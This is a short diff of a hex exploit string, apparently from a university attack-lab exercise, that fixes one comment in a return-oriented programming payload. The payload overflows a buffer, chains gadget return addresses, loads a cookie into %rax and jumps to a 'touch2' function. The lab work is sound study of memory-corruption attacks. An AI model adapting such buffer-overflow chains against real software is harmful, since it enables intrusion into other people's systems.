@@ -4,6 +4,6 @@
 33 33 33 33 33 33 33 33     /* normal content for padding */
 44 44 44 44 44 44 44 44     /* normal content for padding */
 f4 1a 40 00 00 00 00 00     /* return address1: 0x401af4 */
-68 ae 92 4c 00 00 00 00     / cookie: 4c92ae68 for %rax when pop */
+68 ae 92 4c 00 00 00 00     /* cookie: 4c92ae68 for %rax when pop */
 d6 1a 40 00 00 00 00 00     /* return address2: 0x401ad6 */
 21 19 40 00 00 00 00 00     /* return address3: 0x401921<touch2> */
